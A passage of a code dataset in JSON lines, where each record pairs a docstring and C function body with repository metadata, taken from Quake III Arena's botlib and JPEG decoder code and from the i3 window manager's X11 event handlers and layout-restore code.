value;\n}", "path": "Quake-III-Arena/code/botlib/l_libvar.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "/*\n * Initialize for an upsampling pass.\n */\n", "func_signal": "METHODDEF void\nstart_pass_merged_upsample (j_decompress_ptr cinfo)", "code": "{\n  my_upsample_ptr upsample = (my_upsample_ptr) cinfo->upsample;\n\n  /* Mark the spare buffer empty */\n  upsample->spare_full = FALSE;\n  /* Initialize total-height counter for detecting bottom of image */\n  upsample->rows_to_go = cinfo->output_height;\n}", "path": "Quake-III-Arena/code/jpeg-6/jdmerge.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "//end of the function LibVarSet\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "qboolean LibVarChanged(char *var_name)", "code": "{\n\tlibvar_t *v;\n\n\tv = LibVarGet(var_name);\n\tif (v)\n\t{\n\t\treturn v->modified;\n\t} //end if\n\telse\n\t{\n\t\treturn qfalse;\n\t} //end else\n}", "path": "Quake-III-Arena/code/botlib/l_libvar.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "/*\n * Module initialization routine for merged upsampling/color conversion.\n *\n * NB: this is called under the conditions determined by use_merged_upsample()\n * in jdmaster.c.  That routine MUST correspond to the actual capabilities\n * of this module; no safety checks are made here.\n */\n", "func_signal": "GLOBAL void\njinit_merged_upsampler (j_decompress_ptr cinfo)", "code": "{\n  my_upsample_ptr upsample;\n\n  upsample = (my_upsample_ptr)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\tSIZEOF(my_upsampler));\n  cinfo->upsample = (struct jpeg_upsampler *) upsample;\n  upsample->pub.start_pass = start_pass_merged_upsample;\n  upsample->pub.need_context_rows = FALSE;\n\n  upsample->out_row_width = cinfo->output_width * cinfo->out_color_components;\n\n  if (cinfo->max_v_samp_factor == 2) {\n    upsample->pub.upsample = merged_2v_upsample;\n    upsample->upmethod = h2v2_merged_upsample;\n    /* Allocate a spare row buffer */\n    upsample->spare_row = (JSAMPROW)\n      (*cinfo->mem->alloc_large) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t(size_t) (upsample->out_row_width * SIZEOF(JSAMPLE)));\n  } else {\n    upsample->pub.upsample = merged_1v_upsample;\n    upsample->upmethod = h2v1_merged_upsample;\n    /* No spare row needed */\n    upsample->spare_row = NULL;\n  }\n\n  build_ycc_rgb_table(cinfo);\n}", "path": "Quake-III-Arena/code/jpeg-6/jdmerge.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "//end of the function LibVarChanged\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "void LibVarSetNotModified(char *var_name)", "code": "{\n\tlibvar_t *v;\n\n\tv = LibVarGet(var_name);\n\tif (v)\n\t{\n\t\tv->modified = qfalse;\n\t} //end if\n}", "path": "Quake-III-Arena/code/botlib/l_libvar.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "/*\n * Initialize tables for YCC->RGB colorspace conversion.\n * This is taken directly from jdcolor.c; see that file for more info.\n */\n", "func_signal": "LOCAL void\nbuild_ycc_rgb_table (j_decompress_ptr cinfo)", "code": "{\n  my_upsample_ptr upsample = (my_upsample_ptr) cinfo->upsample;\n  int i;\n  INT32 x;\n  SHIFT_TEMPS\n\n  upsample->Cr_r_tab = (int *)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\t(MAXJSAMPLE+1) * SIZEOF(int));\n  upsample->Cb_b_tab = (int *)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\t(MAXJSAMPLE+1) * SIZEOF(int));\n  upsample->Cr_g_tab = (INT32 *)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\t(MAXJSAMPLE+1) * SIZEOF(INT32));\n  upsample->Cb_g_tab = (INT32 *)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\t(MAXJSAMPLE+1) * SIZEOF(INT32));\n\n  for (i = 0, x = -CENTERJSAMPLE; i <= MAXJSAMPLE; i++, x++) {\n    /* i is the actual input pixel value, in the range 0..MAXJSAMPLE */\n    /* The Cb or Cr value we are thinking of is x = i - CENTERJSAMPLE */\n    /* Cr=>R value is nearest int to 1.40200 * x */\n    upsample->Cr_r_tab[i] = (int)\n\t\t    RIGHT_SHIFT(FIX(1.40200) * x + ONE_HALF, SCALEBITS);\n    /* Cb=>B value is nearest int to 1.77200 * x */\n    upsample->Cb_b_tab[i] = (int)\n\t\t    RIGHT_SHIFT(FIX(1.77200) * x + ONE_HALF, SCALEBITS);\n    /* Cr=>G value is scaled-up -0.71414 * x */\n    upsample->Cr_g_tab[i] = (- FIX(0.71414)) * x;\n    /* Cb=>G value is scaled-up -0.34414 * x */\n    /* We also add in ONE_HALF so that need not do it in inner loop */\n    upsample->Cb_g_tab[i] = (- FIX(0.34414)) * x + ONE_HALF;\n  }\n}", "path": "Quake-III-Arena/code/jpeg-6/jdmerge.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "//end of the function LibVarAlloc\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "void LibVarDeAlloc(libvar_t *v)", "code": "{\n\tif (v->string) FreeMemory(v->string);\n\tFreeMemory(v);\n}", "path": "Quake-III-Arena/code/botlib/l_libvar.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "/*\n================\nSys_SnapVector\n================\n*/\n", "func_signal": "long fastftol( float f )", "code": "{\n\tstatic int tmp;\n\t__asm fld f\n\t__asm fistp tmp\n\t__asm mov eax, tmp\n}", "path": "Quake-III-Arena/code/win32/win_shared.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "//end of the function LibVarGetValue\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "libvar_t *LibVar(char *var_name, char *value)", "code": "{\n\tlibvar_t *v;\n\tv = LibVarGet(var_name);\n\tif (v) return v;\n\t//create new variable\n\tv = LibVarAlloc(var_name);\n\t//variable string\n\tv->string = (char *) GetMemory(strlen(value) + 1);\n\tstrcpy(v->string, value);\n\t//the value\n\tv->value = LibVarStringValue(v->string);\n\t//variable is modified\n\tv->modified = qtrue;\n\t//\n\treturn v;\n}", "path": "Quake-III-Arena/code/botlib/l_libvar.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake-III-Arena", "stars": 6782, "license": "gpl-2.0", "language": "c", "size": 3576}
{"docstring": "/*\n * Handles FocusIn events which are generated by clients (i3\u2019s focus changes\n * don\u2019t generate FocusIn events due to a different EventMask) and updates the\n * decorations accordingly.\n *\n */\n", "func_signal": "static void handle_focus_in(xcb_focus_in_event_t *event)", "code": "{\n    DLOG(\"focus change in, for window 0x%08x\\n\", event->event);\n\n    if (event->event == root) {\n        DLOG(\"Received focus in for root window, refocusing the focused window.\\n\");\n        con_focus(focused);\n        focused_id = XCB_NONE;\n        x_push_changes(croot);\n    }\n\n    Con *con;\n    if ((con = con_by_window_id(event->event)) == NULL || con->window == NULL)\n        return;\n    DLOG(\"That is con %p / %s\\n\", con, con->name);\n\n    if (event->mode == XCB_NOTIFY_MODE_GRAB ||\n        event->mode == XCB_NOTIFY_MODE_UNGRAB) {\n        DLOG(\"FocusIn event for grab/ungrab, ignoring\\n\");\n        return;\n    }\n\n    if (event->detail == XCB_NOTIFY_DETAIL_POINTER) {\n        DLOG(\"notify detail is pointer, ignoring this event\\n\");\n        return;\n    }\n\n    /* Floating windows should be refocused to ensure that they are on top of\n     * other windows. */\n    if (focused_id == event->event && !con_inside_floating(con)) {\n        DLOG(\"focus matches the currently focused window, not doing anything\\n\");\n        return;\n    }\n\n    /* Skip dock clients, they cannot get the i3 focus. */\n    if (con->parent->type == CT_DOCKAREA) {\n        DLOG(\"This is a dock client, not focusing.\\n\");\n        return;\n    }\n\n    DLOG(\"focus is different / refocusing floating window: updating decorations\\n\");\n\n    con_activate_unblock(con);\n\n    /* We update focused_id because we don\u2019t need to set focus again */\n    focused_id = event->event;\n    tree_render();\n}", "path": "i3/src/handlers.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Kill the placeholder window, if placeholder refers to a placeholder window.\n * This function is called when manage.c puts a window into an existing\n * container. In order not to leak resources, we need to destroy the window and\n * all associated X11 objects (pixmap/gc).\n *\n */\n", "func_signal": "bool restore_kill_placeholder(xcb_window_t placeholder)", "code": "{\n    placeholder_state *state;\n    TAILQ_FOREACH (state, &state_head, state) {\n        if (state->window != placeholder)\n            continue;\n\n        xcb_destroy_window(restore_conn, state->window);\n        draw_util_surface_free(restore_conn, &(state->surface));\n        TAILQ_REMOVE(&state_head, state, state);\n        free(state);\n        DLOG(\"placeholder window 0x%08x destroyed.\\n\", placeholder);\n        return true;\n    }\n\n    DLOG(\"0x%08x is not a placeholder window, ignoring.\\n\", placeholder);\n    return false;\n}", "path": "i3/src/restore_layout.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Configure requests are received when the application wants to resize windows\n * on their own.\n *\n * We generate a synthethic configure notify event to signalize the client its\n * \"new\" position.\n *\n */\n", "func_signal": "static void handle_configure_request(xcb_configure_request_event_t *event)", "code": "{\n    Con *con;\n\n    DLOG(\"window 0x%08x wants to be at %dx%d with %dx%d\\n\",\n         event->window, event->x, event->y, event->width, event->height);\n\n    /* For unmanaged windows, we just execute the configure request. As soon as\n     * it gets mapped, we will take over anyways. */\n    if ((con = con_by_window_id(event->window)) == NULL) {\n        DLOG(\"Configure request for unmanaged window, can do that.\\n\");\n\n        uint32_t mask = 0;\n        uint32_t values[7];\n        int c = 0;\n#define COPY_MASK_MEMBER(mask_member, event_member) \\\n    do {                                            \\\n        if (event->value_mask & mask_member) {      \\\n            mask |= mask_member;                    \\\n            values[c++] = event->event_member;      \\\n        }                                           \\\n    } while (0)\n\n        COPY_MASK_MEMBER(XCB_CONFIG_WINDOW_X, x);\n        COPY_MASK_MEMBER(XCB_CONFIG_WINDOW_Y, y);\n        COPY_MASK_MEMBER(XCB_CONFIG_WINDOW_WIDTH, width);\n        COPY_MASK_MEMBER(XCB_CONFIG_WINDOW_HEIGHT, height);\n        COPY_MASK_MEMBER(XCB_CONFIG_WINDOW_BORDER_WIDTH, border_width);\n        COPY_MASK_MEMBER(XCB_CONFIG_WINDOW_SIBLING, sibling);\n        COPY_MASK_MEMBER(XCB_CONFIG_WINDOW_STACK_MODE, stack_mode);\n\n        xcb_configure_window(conn, event->window, mask, values);\n        xcb_flush(conn);\n\n        return;\n    }\n\n    DLOG(\"Configure request!\\n\");\n\n    Con *workspace = con_get_workspace(con);\n    if (workspace && (strcmp(workspace->name, \"__i3_scratch\") == 0)) {\n        DLOG(\"This is a scratchpad container, ignoring ConfigureRequest\\n\");\n        goto out;\n    }\n    Con *fullscreen = con_get_fullscreen_covering_ws(workspace);\n\n    if (fullscreen != con && con_is_floating(con) && con_is_leaf(con)) {\n        /* find the height for the decorations */\n        int deco_height = con->deco_rect.height;\n        /* we actually need to apply the size/position changes to the *parent*\n         * container */\n        Rect bsr = con_border_style_rect(con);\n        if (con->border_style == BS_NORMAL) {\n            bsr.y += deco_height;\n            bsr.height -= deco_height;\n        }\n        Con *floatingcon = con->parent;\n        Rect newrect = floatingcon->rect;\n\n        if (event->value_mask & XCB_CONFIG_WINDOW_X) {\n            newrect.x = event->x + (-1) * bsr.x;\n            DLOG(\"proposed x = %d, new x is %d\\n\", event->x, newrect.x);\n        }\n        if (event->value_mask & XCB_CONFIG_WINDOW_Y) {\n            newrect.y = event->y + (-1) * bsr.y;\n            DLOG(\"proposed y = %d, new y is %d\\n\", event->y, newrect.y);\n        }\n        if (event->value_mask & XCB_CONFIG_WINDOW_WIDTH) {\n            newrect.width = event->width + (-1) * bsr.width;\n            newrect.width += con->border_width * 2;\n            DLOG(\"proposed width = %d, new width is %d (x11 border %d)\\n\",\n                 event->width, newrect.width, con->border_width);\n        }\n        if (event->value_mask & XCB_CONFIG_WINDOW_HEIGHT) {\n            newrect.height = event->height + (-1) * bsr.height;\n            newrect.height += con->border_width * 2;\n            DLOG(\"proposed height = %d, new height is %d (x11 border %d)\\n\",\n                 event->height, newrect.height, con->border_width);\n        }\n\n        DLOG(\"Container is a floating leaf node, will do that.\\n\");\n        floating_reposition(floatingcon, newrect);\n        return;\n    }\n\n    /* Dock windows can be reconfigured in their height and moved to another output. */\n    if (con->parent && con->parent->type == CT_DOCKAREA) {\n        DLOG(\"Reconfiguring dock window (con = %p).\\n\", con);\n        if (event->value_mask & XCB_CONFIG_WINDOW_HEIGHT) {\n            DLOG(\"Dock client wants to change height to %d, we can do that.\\n\", event->height);\n\n            con->geometry.height = event->height;\n            tree_render();\n        }\n\n        if (event->value_mask & XCB_CONFIG_WINDOW_X || event->value_mask & XCB_CONFIG_WINDOW_Y) {\n            int16_t x = event->value_mask & XCB_CONFIG_WINDOW_X ? event->x : (int16_t)con->geometry.x;\n            int16_t y = event->value_mask & XCB_CONFIG_WINDOW_Y ? event->y : (int16_t)con->geometry.y;\n\n            Con *current_output = con_get_output(con);\n            Output *target = get_output_containing(x, y);\n            if (target != NULL && current_output != target->con) {\n                DLOG(\"Dock client is requested to be moved to output %s, moving it there.\\n\", output_primary_name(target));\n                Match *match;\n                Con *nc = con_for_window(target->con, con->window, &match);\n                DLOG(\"Dock client will be moved to container %p.\\n\", nc);\n                con_detach(con);\n                con_attach(con, nc, false);\n\n                tree_render();\n            } else {\n                DLOG(\"Dock client will not be moved, we only support moving it to another output.\\n\");\n            }\n        }\n        goto out;\n    }\n\n    if (event->value_mask & XCB_CONFIG_WINDOW_STACK_MODE) {\n        DLOG(\"window 0x%08x wants to be stacked %d\\n\", event->window, event->stack_mode);\n\n        /* Emacs and IntelliJ Idea \u201crequest focus\u201d by stacking their window\n         * above all others. */\n        if (event->stack_mode != XCB_STACK_MODE_ABOVE) {\n            DLOG(\"stack_mode != XCB_STACK_MODE_ABOVE, ignoring ConfigureRequest\\n\");\n            goto out;\n        }\n\n        if (fullscreen || !con_is_leaf(con)) {\n            DLOG(\"fullscreen or not a leaf, ignoring ConfigureRequest\\n\");\n            goto out;\n        }\n\n        if (workspace == NULL) {\n            DLOG(\"Window is not being managed, ignoring ConfigureRequest\\n\");\n            goto out;\n        }\n\n        if (config.focus_on_window_activation == FOWA_FOCUS || (config.focus_on_window_activation == FOWA_SMART && workspace_is_visible(workspace))) {\n            DLOG(\"Focusing con = %p\\n\", con);\n            workspace_show(workspace);\n            con_activate_unblock(con);\n            tree_render();\n        } else if (config.focus_on_window_activation == FOWA_URGENT || (config.focus_on_window_activation == FOWA_SMART && !workspace_is_visible(workspace))) {\n            DLOG(\"Marking con = %p urgent\\n\", con);\n            con_set_urgency(con, true);\n            tree_render();\n        } else {\n            DLOG(\"Ignoring request for con = %p.\\n\", con);\n        }\n    }\n\nout:\n    fake_absolute_configure_notify(con);\n}", "path": "i3/src/handlers.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Handles the transient for hints set by a window, signalizing that this window is a popup window\n * for some other window.\n *\n * See ICCCM 4.1.2.6 for more details\n *\n */\n", "func_signal": "static bool handle_transient_for(Con *con, xcb_get_property_reply_t *prop)", "code": "{\n    window_update_transient_for(con->window, prop);\n    return true;\n}", "path": "i3/src/handlers.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Called when a window changes its title\n *\n */\n", "func_signal": "static bool handle_windowname_change(Con *con, xcb_get_property_reply_t *prop)", "code": "{\n    char *old_name = (con->window->name != NULL ? sstrdup(i3string_as_utf8(con->window->name)) : NULL);\n\n    window_update_name(con->window, prop);\n\n    con = remanage_window(con);\n\n    x_push_changes(croot);\n\n    if (window_name_changed(con->window, old_name))\n        ipc_send_window_event(\"title\", con);\n\n    FREE(old_name);\n\n    return true;\n}", "path": "i3/src/handlers.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Window size has changed. Update the width/height, then recreate the back\n * buffer pixmap and the accompanying graphics context and force an immediate\n * re-rendering.\n *\n */\n", "func_signal": "static void configure_notify(xcb_configure_notify_event_t *event)", "code": "{\n    placeholder_state *state;\n    TAILQ_FOREACH (state, &state_head, state) {\n        if (state->window != event->window)\n            continue;\n\n        DLOG(\"ConfigureNotify: window 0x%08x has now width=%d, height=%d (con %p)\\n\",\n             state->window, event->width, event->height, state->con);\n\n        state->rect.width = event->width;\n        state->rect.height = event->height;\n\n        draw_util_surface_set_size(&(state->surface), state->rect.width, state->rect.height);\n\n        update_placeholder_contents(state);\n\n        return;\n    }\n\n    ELOG(\"Received ConfigureNotify for unknown window 0x%08x\\n\", event->window);\n}", "path": "i3/src/restore_layout.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Checks if the given sequence is ignored and returns true if so.\n *\n */\n", "func_signal": "bool event_is_ignored(const int sequence, const int response_type)", "code": "{\n    struct Ignore_Event *event;\n    time_t now = time(NULL);\n    for (event = SLIST_FIRST(&ignore_events); event != SLIST_END(&ignore_events);) {\n        if ((now - event->added) > 5) {\n            struct Ignore_Event *save = event;\n            event = SLIST_NEXT(event, ignore_events);\n            SLIST_REMOVE(&ignore_events, save, Ignore_Event, ignore_events);\n            free(save);\n        } else\n            event = SLIST_NEXT(event, ignore_events);\n    }\n\n    SLIST_FOREACH (event, &ignore_events, ignore_events) {\n        if (event->sequence != sequence)\n            continue;\n\n        if (event->response_type != -1 &&\n            event->response_type != response_type)\n            continue;\n\n        /* instead of removing a sequence number we better wait until it gets\n         * garbage collected. it may generate multiple events (there are multiple\n         * enter_notifies for one configure_request, for example). */\n        //SLIST_REMOVE(&ignore_events, event, Ignore_Event, ignore_events);\n        //free(event);\n        return true;\n    }\n\n    return false;\n}", "path": "i3/src/handlers.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Having verboselog() and errorlog() is necessary when using libi3.\n *\n */\n", "func_signal": "void verboselog(char *fmt, ...)", "code": "{\n    va_list args;\n\n    va_start(args, fmt);\n    vfprintf(stdout, fmt, args);\n    va_end(args);\n}", "path": "i3/i3-msg/main.c", "commit_date": "2020-06-16 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Called with coordinates of an enter_notify event or motion_notify event\n * to check if the user crossed virtual screen boundaries and adjust the\n * current workspace, if so.\n *\n */\n", "func_signal": "static void check_crossing_screen_boundary(uint32_t x, uint32_t y)", "code": "{\n    Output *output;\n\n    /* If the user disable focus follows mouse, we have nothing to do here */\n    if (config.disable_focus_follows_mouse)\n        return;\n\n    if ((output = get_output_containing(x, y)) == NULL) {\n        ELOG(\"ERROR: No such screen\\n\");\n        return;\n    }\n\n    if (output->con == NULL) {\n        ELOG(\"ERROR: The screen is not recognized by i3 (no container associated)\\n\");\n        return;\n    }\n\n    /* Focus the output on which the user moved their cursor */\n    Con *old_focused = focused;\n    Con *next = con_descend_focused(output_get_content(output->con));\n    /* Since we are switching outputs, this *must* be a different workspace, so\n     * call workspace_show() */\n    workspace_show(con_get_workspace(next));\n    con_focus(next);\n\n    /* If the focus changed, we re-render to get updated decorations */\n    if (old_focused != focused)\n        tree_render();\n}", "path": "i3/src/handlers.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Open placeholder windows for all children of parent. The placeholder window\n * will vanish as soon as a real window is swallowed by the container. Until\n * then, it exposes the criteria that must be fulfilled for a window to be\n * swallowed by this container.\n *\n */\n", "func_signal": "void restore_open_placeholder_windows(Con *parent)", "code": "{\n    Con *child;\n    TAILQ_FOREACH (child, &(parent->nodes_head), nodes) {\n        open_placeholder_window(child);\n    }\n    TAILQ_FOREACH (child, &(parent->floating_head), floating_windows) {\n        open_placeholder_window(child);\n    }\n\n    xcb_flush(restore_conn);\n}", "path": "i3/src/restore_layout.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Our window decorations were unmapped. That means, the window will be killed\n * now, so we better clean up before.\n *\n */\n", "func_signal": "static void handle_unmap_notify_event(xcb_unmap_notify_event_t *event)", "code": "{\n    DLOG(\"UnmapNotify for 0x%08x (received from 0x%08x), serial %d\\n\", event->window, event->event, event->sequence);\n    xcb_get_input_focus_cookie_t cookie;\n    Con *con = con_by_window_id(event->window);\n    if (con == NULL) {\n        /* This could also be an UnmapNotify for the frame. We need to\n         * decrement the ignore_unmap counter. */\n        con = con_by_frame_id(event->window);\n        if (con == NULL) {\n            LOG(\"Not a managed window, ignoring UnmapNotify event\\n\");\n            return;\n        }\n\n        if (con->ignore_unmap > 0)\n            con->ignore_unmap--;\n        /* See the end of this function. */\n        cookie = xcb_get_input_focus(conn);\n        DLOG(\"ignore_unmap = %d for frame of container %p\\n\", con->ignore_unmap, con);\n        goto ignore_end;\n    }\n\n    /* See the end of this function. */\n    cookie = xcb_get_input_focus(conn);\n\n    if (con->ignore_unmap > 0) {\n        DLOG(\"ignore_unmap = %d, dec\\n\", con->ignore_unmap);\n        con->ignore_unmap--;\n        goto ignore_end;\n    }\n\n    /* Since we close the container, we need to unset _NET_WM_DESKTOP and\n     * _NET_WM_STATE according to the spec. */\n    xcb_delete_property(conn, event->window, A__NET_WM_DESKTOP);\n    xcb_delete_property(conn, event->window, A__NET_WM_STATE);\n\n    tree_close_internal(con, DONT_KILL_WINDOW, false);\n    tree_render();\n\nignore_end:\n    /* If the client (as opposed to i3) destroyed or unmapped a window, an\n     * EnterNotify event will follow (indistinguishable from an EnterNotify\n     * event caused by moving your mouse), causing i3 to set focus to whichever\n     * window is now visible.\n     *\n     * In a complex stacked or tabbed layout (take two v-split containers in a\n     * tabbed container), when the bottom window in tab2 is closed, the bottom\n     * window of tab1 is visible instead. X11 will thus send an EnterNotify\n     * event for the bottom window of tab1, while the focus should be set to\n     * the remaining window of tab2.\n     *\n     * Therefore, we ignore all EnterNotify events which have the same sequence\n     * as an UnmapNotify event. */\n    add_ignore_event(event->sequence, XCB_ENTER_NOTIFY);\n\n    /* Since we just ignored the sequence of this UnmapNotify, we want to make\n     * sure that following events use a different sequence. When putting xterm\n     * into fullscreen and moving the pointer to a different window, without\n     * using GetInputFocus, subsequent (legitimate) EnterNotify events arrived\n     * with the same sequence and thus were ignored (see ticket #609). */\n    free(xcb_get_input_focus_reply(conn, cookie, NULL));\n}", "path": "i3/src/handlers.c", "commit_date": "2020-10-18 00:00:00", "repo_name": "Airblader/i3", "stars": 5921, "license": "bsd-3-clause", "language": "c", "size": 13512}
{"docstring": "/*\n * Handle client messages (EWMH)\n *\n */\n", "func_signal": "static void handle_client_message(xcb_client_message_event_t *event)", "code": "{\n    /* If this is a startup notification ClientMessage, the library will handle\n     * it and call our monitor_event() callback. */\n    if (sn_xcb_display_process_event(sndisplay, (xcb_generic_event_t *)event))\n        return;\n\n    LOG(\"ClientMessage for window 0x%08x\\n\", event->window);\n    if (event->type == A__NET_WM_STATE) {\n        if (event->format != 32 ||\n            (event->data.data32[1] != A__NET_WM_STATE_FULLSCREEN &&\n             event->data.data32[1] != A__NET_WM_STATE_DEMANDS_ATTENTION &&\n             event->data.data32[1] != A__NET_WM_STATE_STICKY)) {\n            DLOG(\"Unknown atom in clientmessage of type %d\\n\", event->data.data32[1]);\n            return;\n        }\n\n        Con *con = con_by_window_id(event->window);\n        if (con == NULL) {\n            DLOG(\"Could not get window for client message\\n\");\n            return;\n        }\n\n        if (event->data.data32[1] == A__NET_WM_STATE_FULLSCREEN) {\n            /* Check if the fullscreen state should be toggled */\n            if ((con->fullscreen_mode != CF_NONE &&\n                 (event->data.data32[0] == _NET_WM_STATE_REMOVE ||\n                  event->data.data32[0] == _NET_WM_STATE_TOGGLE)) ||\n                (con->fullscreen_mode == CF_NONE &&\n                 (event->data.data32[0] == _NET_WM_STATE_ADD ||\n                  event->data.data32[0] == _NET_WM_STATE_TOGGLE))) {\n                DLOG(\"toggling fullscreen\\n\");\n                con_toggle_fullscreen(con, CF_OUTPUT);\n            }\n        } else if (event->data.data32[1] == A__NET_WM_STATE_DEMANDS_ATTENTION) {\n            /* Check if the urgent flag must be set or not */\n            if (event->data.data32[0] == _NET_WM_STATE_ADD)\n                con_set_urgency(con, true);\n            else if (event->data.data32[0] == _NET_WM_STATE_REMOVE)\n                con_set_urgency(con, false);\n            else if (event->data.data32[0] == _NET_WM_STATE_TOGGLE)\n                con_set_urgency(con, !con->urgent);\n        } else if (event->data.data32[1] == A__NET_WM_STATE_STICKY) {\n            DLOG(\"Received a client message to modify _NET_WM_STATE_STICKY.\\n\");\n            if (event->data.data32[0] == _NET_WM_STATE_ADD)\n                con->sticky = true;\n            else if (event->data.data32[0] == _NET_WM_STATE_REMOVE)\n                con->sticky = false;\n            else if (event->data.data32[0] == _NET_WM_STATE_TOGGLE)\n                con->sticky = !con->sticky;\n\n            DLOG(\"New sticky status for con = %p is %i.\\n\", con, con->sticky);\n            ewmh_update_sticky(con->window->id, con->sticky);\n            output_push_sticky_windows(focused);\n            ewmh_update_wm_desktop();\n        }\n\n        tree_render();\n    } else if (event->type == A__NET_ACTIVE_WINDOW) {\n        if (event->format != 32)\n            return;\n\n        DLOG(\"_NET_ACTIVE_WINDOW: Window 0x%08x should be activated\\n\", event->window);\n\n        Con *con = con_by_window_id(event->window);\n        if (con == NULL) {\n            DLOG(\"Could not get window for client message\\n\");\n            return;\n        }\n\n        Con *ws = con_get_workspace(con);\n        if (ws == NULL) {\n            DLOG(\"Window is not being managed, ignoring _NET_ACTIVE_WINDOW\\n\");\n            return;\n        }\n\n        if (con_is_internal(ws) && ws != workspace_get(\"__i3_scratch\")) {\n            DLOG(\"Workspace is internal but not scratchpad, ignoring _NET_ACTIVE_WINDOW\\n\");\n            return;\n        }\n\n        /* data32[0] indicates the source of the request (application or pager) */\n        if (event->data.data32[0] == 2) {\n            /* Always focus the con if it is from a pager, because this is most\n             * likely from some user action */\n            DLOG(\"This request came from a pager. Focusing con = %p\\n\", con);\n\n            if (con_is_internal(ws)) {\n                scratchpad_show(con);\n            } else {\n                workspace_show(ws);\n                /* Re-set focus, even if unchanged from i3\u2019s perspective. */\n                focused_id = XCB_NONE;\n                con_activate_unblock(con);\n            }\n        } else {\n            /* Request is from an application. */\n            if (con_is_internal(ws)) {\n                DLOG(\"Ignoring request to make con = %p active because it's on an internal workspace.\\n\", con);\n                return;\n            }\n\n            if (config.focus_on_window_activation == FOWA_FOCUS || (config.focus_on_window_activation == FOWA_SMART && workspace_is_visible(ws))) {\n                DLOG(\"Focusing con = %p\\n\", con);\n                con_activate_unblock(con);\n            } else if (config.focus_on_window_activation == FOWA_URGENT || (config.focus_on_window_activation == FOWA_SMART && !workspace_is_visible(ws))) {\n                DLOG(\"Marking con = %p urgent\\n\", con);\n                con_set_urgency(con, true);\n            } else\n                DLOG(\"Ignoring request for con = %p.\\n\", con);\n        }\n\n        tree_render();\n    } else if (event->type == A_I3_SYNC) {\n        xcb_window_t window = event->data.data32[0];\n        uint32_t rnd = event->data.data32[1];\n        sync_respond(window, rnd);\n    } else if (event->type == A__NET_REQUEST_FRAME_EXTENTS) {\n        /*\n         * A client can request an estimate for the frame size which the window\n         * manager will put around it before actually mapping its window. Java\n         * does this (as of openjdk-7).\n         *\n         * Note that the calculation below is not entirely accurate \u2014 once you\n         * set a different border type, it\u2019s off. We _could_ request all the\n         * window properties (which have to be set up at this point according\n         * to EWMH), but that seems rather elaborate. The standard explicitly\n         * says the application must cope with an estimate that is not entirely\n         * accurate.\n         */\n        DLOG(\"_NET_REQUEST_FRAME_EXTENTS for window 0x%08x\\n\", 